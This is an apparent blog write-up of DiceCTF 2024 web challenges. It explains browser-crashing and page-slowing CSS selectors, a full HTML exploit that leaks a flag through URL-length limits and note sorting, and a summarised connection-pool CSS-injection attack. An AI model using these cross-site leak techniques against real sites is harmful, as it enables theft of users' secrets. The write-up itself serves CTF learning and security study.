---
title: DiceCTF 2024 Writeup
date: 2024-02-12 13:40:00
catalog: true
tags: [Security]
categories: [Security]
photos: /img/dicectf-2024-writeup/cover-en.png
---

Compared to [last year](https://blog.huli.tw/2023/03/26/en/dicectf-2023-writeup/) and [the year before](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/), the difficulty of this year's web challenges has significantly decreased, making them more approachable and beginner-friendly(It's good to have both easy and difficult challenges). With the effort of my teammates, we managed to secure the first place, leaving only one web challenge unsolved.

This time, I only managed to solve the simple "funnylogin" and the challenging "safestlist" challenges. The rest were solved by my teammates. I also took a look at another challenge called "another-csp". Therefore, this post will only cover the challenges I reviewed and the more difficult ones.

If you want to see other challenges, you can refer to other people's writeups:

1. [st98 - DiceCTF 2024 Quals writeup](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003)
2. [0xOne - 2024 Dice CTF Write up [Web]](https://one3147.tistory.com/77)

All challenge source code provided by the organizers can be found at: https://github.com/dicegang/dicectf-quals-2024-challenges

Keyword list:

1. crash chromium
2. slower css style
3. xsleak
4. URL length limit
5. service worker
6. background fetch
7. connection pool + css injection
8. iframe width + css injection

<!-- more -->

## web/another-csp (16 solves)

The code for this challenge is quite simple, and after simplification, it looks like this:

``` html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>another-csp</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'">
</head>
<body>
  <iframe id="sandbox" name="sandbox" sandbox></iframe>
</body>
<script>
  document.getElementById('form').onsubmit = e => {
    e.preventDefault();
    const code = document.getElementById('code').value;
    const token = localStorage.getItem('token') ?? '0'.repeat(6);
    const content = `<h1 data-token="${token}">${token}</h1>${code}`;
    document.getElementById('sandbox').srcdoc = content;
  }
</script>
</html>
```

You can insert any code into the iframe, with the goal of stealing the token from the same webpage.

The key point is that the iframe's sandbox is strict, as well as the Content Security Policy (CSP). From these two clues, we can deduce the following restrictions:

1. `defeault-src 'none'`, which prohibits the inclusion of any external resources.
2. `sandbox`, which means that no JavaScript can be executed and no redirection can be done through meta tags.

With JavaScript disabled, the attack surface is greatly reduced, so we can only work with HTML and CSS. The CSS for this challenge has `unsafe-inline` enabled, so we can add CSS rules.

However, it seems that we cannot send requests to external resources. So, either we need to find a bypass (such as DNS prefetch, but it may not be applicable to this challenge), or we need to combine it with other parts of the challenge.

The operation of the bot in this challenge is different:

``` js
import { createServer } from 'http';
import { readFileSync } from 'fs';
import { spawn } from 'child_process'
import { randomInt } from 'crypto';

const sleep = timeout => new Promise(resolve => setTimeout(resolve, timeout));
const wait = child => new Promise(resolve => child.on('exit', resolve));
const index = readFileSync('index.html', 'utf-8');

let token = randomInt(2 ** 24).toString(16).padStart(6, '0');
let browserOpen = false;

const visit = async code => {
  browserOpen = true;
  const proc = spawn('node', ['visit.js', token, code], { detached: true });

  await Promise.race([
    wait(proc),
    sleep(10000)
  ]);

  if (proc.exitCode === null) {
    process.kill(-proc.pid);
  }
  browserOpen = false;
}

createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost/');
  if (url.pathname === '/') {
    return res.end(index);
  } else if (url.pathname === '/bot') {
    if (browserOpen) return res.end('already open!');
    const code = url.searchParams.get('code');
    if (!code || code.length > 1000) return res.end('no');
    visit(code);
    return res.end('visiting');
  } else if (url.pathname === '/flag') {
    if (url.searchParams.get('token') !== token) {
      res.end('wrong');
      await sleep(1000);
      process.exit(0);
    }
    return res.end(process.env.FLAG ?? 'dice{flag}');
  }
  return res.end();
}).listen(8080);
```

If `browserOpen` is true, we can obtain information from the response. So, when I saw the challenge, I had an idea: what would happen if we crash Chromium? Can we leak the token using this method?

For example, if we write a CSS rule like `h1[data-token^="0"] { /*crash*/ }` to crash Chromium, it might speed up or slow down the execution of the bot, allowing us to determine if this selector matches.

Later, my teammate found a way to crash Chromium from the Chromium issues:

``` html
<style>
  h1[data-token^="a"] {
    --c1: color-mix(in srgb, blue 50%, red);
    --c2: srgb(from var(--c1) r g b);
    background-color: var(--c2);
  }
</style>
```

In the post-competition discussion, I also saw someone in Discord posting a payload that made the webpage load extremely slowly, achieving a similar effect. This is what @Trixter posted:

``` html
<style>
  html:has([data-token^="a"]) {
      --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
      --b: var(--a),var(--a),var(--a),var(--a),var(--a);
      --c: var(--b),var(--b),var(--b),var(--b),var(--b);
      --d: var(--c),var(--c),var(--c),var(--c),var(--c);
      --e: var(--d),var(--d),var(--d),var(--d),var(--d);
      --f: var(--e),var(--e),var(--e),var(--e),var(--e);
  }
</style>
<style>
  *{
    background-image: var(--f)
  }
</style>
```

It's somewhat similar to the Billion Laughs attack, constructing a super large payload repeatedly to slow down the speed.

After slowing down the speed, we can measure the time it takes for the webpage to load using the method mentioned earlier. If it exceeds 10 seconds, it will time out, allowing us to leak the flag.

## web/safestlist (2 solves)

This challenge is a modified version of a challenge I previously solved: [SekaiCTF 2022 Notes and concurrent limit](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/). Let me briefly describe the modified version.

This challenge is a classic note app. You can create new notes, but the problem is that the note content will be sanitized using `DOMPurify.sanitize`, so XSS is not possible. The CSP part is `default-src 'self'`, which means that requests can only be sent to the origin of the challenge.

In other words, you cannot send requests outside.

In addition to creating notes, you can also delete notes using the index of the note.

The core of this problem is the code for creating a note:

```js
fastify.post("/create", (req, reply) => {
    const { text } = req.body;
    if (!text || typeof text !== "string") {
        return reply.type("text/html").send("Missing text");
    }

    const userNotes = notes.get(req.cookies.id) ?? [];
    const totalLen = userNotes.reduce((prev, curr) => prev + curr.length, 0);

    const newLen = totalLen + text.length;
    if (newLen > 16384) {
        return reply.redirect(`/?message=Cannot add, please delete some notes first (${newLen} > 16384 chars)`);
    }

    userNotes.push(text);
    userNotes.sort();
    notes.set(req.cookies.id, userNotes);

    reply.redirect("/?message=Note added successfully");
});
```

Note the `userNotes.sort();`, which sorts the notes based on their content. The format of the flag is `dice{[a-z]+}`. By using this sorting feature, a simple strategy can be derived.

Assuming the flag is `dice{c}`, and we first create a note with `dice{a`, after creating it, we delete the first note. At this point, `dice{a` will be deleted, leaving the flag `dice{c}`.

If we first create a note with `dice{d`, and then delete the first one, `dice{c}` will be deleted, leaving the newly created `dice{d`.

In other words, depending on the order of creation and deletion of notes, the note that remains will be different.

If I can know which note remains in the end, I can infer the order of the flag. If the note I created remains, it means that the flag must be at the beginning and in lexicographical order.

Therefore, the key to this problem is how to know which note remains.

Based on last year's solution, my initial idea was to make the server side busy. Node.js is single-threaded, so it cannot handle other requests until it finishes processing one (asynchronous is a different story).

So my idea is to create a note with a bunch of `<img src=/?{random_number}>`, which can send about 700-1000 requests within the word limit. By sending a bunch of requests to the server, we make the server busy.

There is another difference in this problem, which is the bot:

``` js
const visit = async (url) => {
    // clear all data
    await fsp.rm(tmpDir, { recursive: true, force: true });

    let browser;
    try {
        browser = await launchBrowser();
        let page = await browser.newPage();

        // set flag
        await page.goto("http://localhost:3000", { timeout: 7500, waitUntil: "networkidle2" });
        await sleep(2000);
        await page.evaluate((flag) => {
            document.querySelector("input[type=text]").value = flag;
            document.querySelector("form[action='/create']").submit();
        }, FLAG);
        await page.waitForNavigation({ waitUntil: "networkidle2" });

        // restart browser, which should close all windows
        await browser.close();
        browser = await launchBrowser();
        page = await browser.newPage();

        // go to the submitted site
        await page.goto(url, { timeout: 7500, waitUntil: "networkidle2" })

        // restart browser, which should close all windows
        await browser.close();
        browser = await launchBrowser();
        page = await browser.newPage();

        // check on notes now that all other windows are closed
        await page.goto("http://localhost:3000", { timeout: 7500, waitUntil: "networkidle2" });
        await sleep(8000);
        await page.evaluate(() => {
            document.querySelector("form[action='/view']").submit();
        });
        await page.waitForNavigation({ waitUntil: "networkidle2" });
        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }
};
```

After accessing the URL we provided, the bot visits the `/view` page. Therefore, we cannot measure the time from the browser this time, but we have to measure it from our local machine. If the idea mentioned earlier is correct, the server response time should be slower.

But after trying for about three or four hours, I found that it didn't work.

There are two reasons for this. First, the server processing speed is too fast. I tested sending 500 requests to localhost, and it took about 400ms to process them. Second, it is difficult to capture the time interval. It is difficult to grasp the time when the bot visits `/view`.

In short, I couldn't find a stable solution after trying for a long time, so I had to give up.

At this point, I shifted my focus to this part when adding a new note:

``` js
const newLen = totalLen + text.length;
if (newLen > 16384) {
    // case 1
    return reply.redirect(`/?message=Cannot add, please delete some notes first (${newLen} > 16384 chars)`);
}

userNotes.push(text);
userNotes.sort();
notes.set(req.cookies.id, userNotes);

// case2
reply.redirect("/?message=Note added successfully");
```

If the note length exceeds 16384, it will be redirected to `/?message=Cannot add, please delete some notes first`. Otherwise, it will be redirected to `/?message=Note added successfully`. In other words, if we can detect which one it is redirected to, we can use a similar method to leak the flag.

I had an idea to guess that the browser should have a limit on the length of the URL. I tried to construct an excessively long URL that would exceed the limit when redirected to `/?message=Cannot add, please delete some notes first`, but not when redirected to `/?message=Note added successfully`.

But the problem is that we cannot control the length of the path. So how can we make the URL longer?

I tried with the username, for example: `http://${'a'.repeat(1000000)}}:pwd@localhost:3000`, and surprisingly, it worked!

You can see the details in the following PoC:

``` html
<!DOCTYPE html>
<html>
<body>
  <form id=f  method="POST" target="winForm">
    <input id=inp name="text" value="">
  </form>

  <script>
    fetch('/hang')
    win = window.open('about:blank', 'winForm')
    const TARGET = 'http://'+ 'a'.repeat(2097050)  + ':def@localhost:3000'
    f.action = TARGET + '/create'

    inp.value = 'a'.repeat(2)
    f.submit()

    let count = 0
    setInterval(() => {
      fetch('/timeout'+count)
      count++
      try {
        let r = win.location.href
        fetch('/?r=' + r)
      } catch(err) {
        fetch('/err')
      }
    }, 500)
      
  </script>

</body>

</html>
```

When I created a note with a length of only 2, the URL was within the limit, so the new page was opened normally, and accessing `win.location.href` triggered a cross-origin error.

![p1](/img/dicectf-2024-writeup/p1.png)

But when I created a note with a length of 20000, the redirected page had a URL that was too long, causing an error, and the newly opened page became `about:blank`, without triggering an error.

![p2](/img/dicectf-2024-writeup/p2.png)

Therefore, it is indeed possible to determine whether the note has been successfully created by the length of the URL.

The final exploit is as follows:

``` html
<!DOCTYPE html>
<html>
<body>
  <form id=f  method="POST" target="winForm">
    <input id=inp name="text" value="">
  </form>

  <form id=f_delete action="http://localhost:3000/remove" method="POST" target="_blank">
    <input name="index" value="0">
  </form>

  <form id=f_create action="http://localhost:3000/create" method="POST" target="_blank">
    <input id=inp2 name="text" value="">
  </form>

  <script>
    const sleep = ms => new Promise(r => setTimeout(r, ms))
    fetch('/hang')
    win = window.open('about:blank', 'winForm')

    f.action = 'http://'+ 'a'.repeat(2097050)  + ':def@localhost:3000' + '/create'

    let count = 0
    setInterval(() => {
      fetch('/ping_' + count)
      count++
    }, 100)

    // abcdefghijklmnopqrstuvwxyz
    async function main() {
      // step1. create note
      let testPayload = 'dice{xs'
      fetch('/step_1_start')
      inp2.value = testPayload + 'z'.repeat(10000)
      f_create.submit()
      await sleep(500)
      fetch('/step_1_end')

      // step2. delete first note
      fetch('/step_2_start')
      f_delete.submit()
      await sleep(500)
      fetch('/step_2_end')

      // step3. leak
      fetch('/step_3_start')
      inp.value = 'a'.repeat(10000)
      f.submit()
      fetch('/step_3_end')

      let count = 0
      setInterval(() => {
        fetch('/timeout'+count)
        count++
        try {
          let r = win.location.href
          fetch('/?r=' + r)
        } catch(err) {
          fetch('/err')
        }

        // err: payload is before flag
        // dice{azzz
        // dice{flag}

        // about:blank, payload is after flag
        // dice{flag}
        // dice{fzzzz}
      }, 200)
    }

    main()
      
  </script>

</body>

</html>
```

By submitting once, you can determine whether the flag's order is before or after a certain character. By using binary search, you can approximately determine the result after about 6 submissions. Each submission requires a 30-second wait, so it takes a total of 3 minutes. Since I didn't automate it, I manually leaked the information slowly.

It took about 40 minutes to obtain the flag, but this was actually unintended.

### Expected Solution

Taking note of the expected solution posted by strellic in Discord, it involves using the background fetch API:

1. Install a service worker and use the background fetch API.
2. This causes the browser to make a special download that resumes on browser start.
3. Laxly post CSRF a lot of img tags to purify.js, with a prefix that gets sorted against the flag (see safelist writeup for more details).
4. Delete the first post.
5. If your post was sorted first, it would be deleted.
6. If it was sorted last, it would not be deleted.
7. When the browser bot checks /view, the browser will take longer to load the page if there are a lot of img tags.
8. If it takes longer to load the page, the browser lasts longer and closes later.
9. When it closes, the background fetch download stops.
10. So, by timing how long your background fetch stays connected to your server, you can leak the outcome of the sort and the flag.

## web/burnbin (1 solve)

First of all, I didn't solve this challenge and didn't have time to look into it. The following is written based on the author's solution.

This challenge is also similar to a classic note app where you can register a new account and create notes, with the ability to upload an image during creation.

Let's start with the bot part:

``` js
const puppeteer = require("puppeteer");
const crypto = require("crypto");

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const visit = async (url) => {
    const user = crypto.randomBytes(16).toString("hex");
    const pass = crypto.randomBytes(32).toString("hex");
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        const context = await browser.createIncognitoBrowserContext();

        const page = await context.newPage();
        await page.goto("http://localhost:3000/register", { timeout: 5000, waitUntil: 'domcontentloaded' });

        // create new account
        await page.waitForSelector("button[type=submit]");
        await page.type("input[placeholder='Username']", user);
        await page.type("input[placeholder='Password']", pass);
        await page.click("button[type=submit]");
        await sleep(3000);

        // create paste with flag
        await page.type("input[placeholder='Title']", "Flag");
        await page.type("textarea[placeholder='Paste contents']", "Flag");
        const imgUpload = await page.$("input[type=file]");
        await imgUpload.uploadFile("./flag.png");
        await page.click("button[type=submit]");
        await sleep(3000);

        // go to exploit page
        await page.goto(url, { timeout: 5000, waitUntil: 'domcontentloaded' });
        await sleep(30_000);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }

    return user;
};

module.exports = { visit };
```

It randomly generates a set of username and password, registers, uploads the flag as an image, and then visits our webpage. So the goal is to steal this image to obtain the flag.

When displaying the note in the frontend, it uses secure display methods, so it's not possible to inject HTML, etc. Therefore, we need to find another way, and uploading files seems suspicious:

``` js

fastify.route({
    method: 'POST',
    path: '/api/create',
    onRequest: requiresLogin,
    handler: async (req, res) => {
        const body = Object.fromEntries(
            Object.keys(req.body).map((key) => [key, req.body[key].value])
        );
        const { title, text } = body;
        
        if (typeof title !== "string" || typeof text !== "string") {
            throw new Error("Title or text must be string");
        }

        if (title.length > 32 || text.length > 512) {
            throw new Error("Title or text too long");
        }

        const id = crypto.randomBytes(8).toString("hex");
        const paste = { id, title, text };

        if (req.body.file) {
            const filename = sanitizeFilename(req.body.file.filename.slice(0, 64), "-");
            const ext = filename.slice(filename.lastIndexOf("."));
            if (![".png", ".jpeg", ".jpg"].includes(ext)) {
                throw new Error("Invalid file format for image");
            }
            const buffer = await req.body.file.toBuffer();
            try {
                await fsp.mkdir(path.join(__dirname, 'public', 'uploads', req.user.user));
            } catch {}
            try {
                await fsp.writeFile(path.join(__dirname, 'public', 'uploads', req.user.user, filename), buffer);
            } catch {}
            paste.image = `${req.user.user}/${filename}`;
        }

        req.user.pastes.push(paste);
        return { success: true };
    }
});
```

When uploading a file, it checks if it ends with `.png`, `.jpeg`, or `.jpg`. If not, it throws an error. Although it seems that only images can be uploaded, if the uploaded file has a `.png` filename, in the old version of fastify static, there won't be a mimetype, and this challenge doesn't prohibit mime sniffing, so HTML or CSS files can be uploaded.

By the way, the CSP for this challenge is as follows:

``` js
fastify.addHook('onRequest', (req, res, done) => {
    if (req.session.get("username") && users.has(req.session.get("username"))) {
        req.user = users.get(req.session.get("username"));
    }
    res.header("Content-Security-Policy", `
        script-src 'sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4=' 'unsafe-inline';
        img-src 'self';
        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/css2;
        font-src https://fonts.gstatic.com/s/inter/;
        frame-ancestors 'none';
        object-src 'none';
        base-uri 'none';
    `.trim().replace(/\s+/g, " "));
    res.header("Cache-Control", "no-cache, no-store");
    res.header("X-Frame-Options", "DENY");
    done();
});
```

Although it seems that `script-src` has `unsafe-inline`, it doesn't actually work. If you try it, you will encounter the following error:

```
refused to execute inline script 
because it violates the following Content Security Policy directive:
"script-src 'sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4=' 'unsafe-inline'". 
Note that 'unsafe-inline' is ignored 
if either a hash or nonce value is present in the source list.
```

Therefore, the only JavaScript that can be used in this challenge is what was originally provided, and everything else needs to be done with CSS.

Using a technique from another challenge previously released by the author, by using dom clobbering defaultView to determine which page the client router should render, it is possible to inject HTML and CSS into any page. For more details, you can refer to my write-up: [corCTF 2022 writeup - modernblog](https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/).

We need to first obtain the post ID that will appear in `/home`, and then obtain the image path that will appear in `/view/:id` to retrieve the flag. The length of this post ID is 16 characters, with each character ranging from 0 to f. The challenge is that this post ID is updated with each request.

``` js
fastify.route({
    method: 'GET',
    path: '/api/pastes',
    onRequest: requiresLogin,
    handler: (req, res) => {
        req.user.pastes.forEach(p => p.id = crypto.randomBytes(8).toString("hex"));
        return req.user.pastes.map(({ id, title }) => ({ id, title }));
    }
});
```

The author's solution is to use CSS + iframe to leak information from the page. If we only need to leak one character, we can use the width and height, like this:

``` html
<style>
  body:has(a[href^="/view/1"]) iframe {
    width: 1px;
  }

  body:has(a[href^="/view/2"]) iframe {
    width: 2px;
  }
</style>
```

Since there is no frame-src in the CSP, this iframe will be from our origin, and we can use `window.innerWidth` to determine the width and thus the first character.

However, the problem is that the ID changes with each request, so we must obtain all the characters within one request, otherwise the ID will be different.

If we want to leak multiple characters at once, one way is to use the technique mentioned in [0CTF 2023](https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/), or another way is recursive import, but this usually requires its own server to work.

The author, however, solved the latter problem by utilizing the connection pool limit. The connection pool appears frequently in CTF challenges. In simple terms, it fills up all 255 connections in Chromium, allowing control over when the next resource is loaded.

The approach is as follows:

1. First, import the first style (let's call it `.jpg`), which will leak the first character and import `.png`.
2. At this point, fill up the connections in our webpage until the first character is leaked and a new style file is uploaded, then release the connections.
3. Repeat the above steps continuously.

The concept should be like this, but there seem to be many implementation details to consider, making it more complex. You can refer to the author's solution provided at the end for more details.

After leaking the ID, we can proceed to leak the image path in the same way.

However, the crucial point is the view note page, which automatically sends a request to delete the image. If an error occurs, an `alert` will be triggered.

``` jsx
import React from "react";
import { Link, useParams, useNavigate } from "react-router-dom";
import axios from 'axios';

export default function View() {
  const { id } = useParams();
  const navigate = useNavigate();

  const [paste, setPaste] = React.useState(null);

  React.useEffect(() => {
    (async () => {
      try {
        const r = await axios.get(`/api/paste/${id}`);
        if (r.data) {
          setPaste(r.data);
          if (!r.data.image) {
            await deletePaste(r.data.id);
          }
        }
      }
      catch (e) {
        alert(e?.response?.data?.message || e.message);
        navigate("/home");
      }
    })();
  }, []);

  const deletePaste = async (id) => {
    try {
      await axios.get(`/api/destroy/${id}`);
    }
    catch (e) {
      alert(e?.response?.data?.message || e.message);
      navigate("/home");
    }
  };

  if (!paste) {
    return <></>
  }

  return (
    <>
      <h3>{paste.title}</h3>
      { paste.image && (
        <img src={`/uploads/${paste.image}`} onLoad={() => deletePaste(paste.id)} onError={() => deletePaste(paste.id)} className="mw-100" />
      )}
      <div style={{ whiteSpace: "pre-line" }} className="mb-2">{paste.text}</div>
      <Link to="/home">← Back</Link>
    </>
  );
}
```

We can use the CSP `connect-src` meta tag to block the request to delete the image and use the `sandbox` attribute of the iframe to prevent the modal from popping up.

But I think the most difficult part of this challenge is to complete everything within 30 seconds. This means that each step must be automated, which is really challenging.

Below is the solution provided by the author strellic, and the above explanation is based on their solution:

1. Uploading files as .png or .jpg without a mimetype (old version of fastify static) allows for mime sniffing (no xcto), so arbitrary HTML/CSS can be uploaded.
2. Use the technique from modernblog (clobber defaultView) and upload arbitrary HTML that React Router thinks is a target path. This allows us to add custom HTML onto any page of the React app.
3. Now, we need to leak both the flag post ID and username. We do this with CSS injection and iframes.
4. We can use CSS to change the width/height of an iframe, and since there is no frame-src, we can point it to our own domain and read these values.
5. I use `window.open` to get a window reference, then repeatedly read `w.frames[0].innerWidth`.
6. The only issue is, how do we leak the entire ID if the post IDs change on every refresh?
7. Let's use the classic CSS recursive import (with a twist).
8. The issue with recursive import is that you need to import from a server you control. You need this because you need the next CSS file request to stop responding until you leak the previous data so you know what CSS to send. But `style-src` is set to `self`, so we can't stall the next CSS file - or can we?
9. My solution: let's abuse the connection pool! If we block every socket on another tab, we can stop the CSS from importing until we are ready, and we can unblock and reblock the socket pool at will.
10. This allows us to control the time at which the next CSS file is uploaded, essentially letting us recreate the recursive CSS technique even when we don't control the target server!
11. This is a little complicated. We need to remove `type="module"` from the script tag so it doesn't block, and move it to the body. Additionally, we have to start the initial CSS request in a style tag (which is why `unsafe-inline` is there), otherwise it blocks.
12. We also need to create a "buffer" of empty CSS files that just request another one so we can account for the initial API requests (as they happen in tandem with the CSS requests).
13. With this, you can leak the post ID.
14. Now, to leak the username, you do the same technique but need to stop the image from being deleted.
15. Use a CSP meta tag with `connect-src` to stop it from requesting the destroy endpoint.
16. But this causes an alert which blocks everything, so you put this in an iframe `srcdoc` that doesn't allow modals.
17. Do all of this in 30 seconds and you can get the flag! (My solution finishes in 25 seconds with no optimization)

## Afterword

I have been busy with other things lately and haven't been doing CTF for a while. I feel a bit rusty, but I'm really happy to have solved safestlist. It means my skills haven't deteriorated too much XD

In addition, this post is also an update after a two-month gap. It is the first post of 2024. Although it's a bit late, I still want to wish all readers a happy new year.
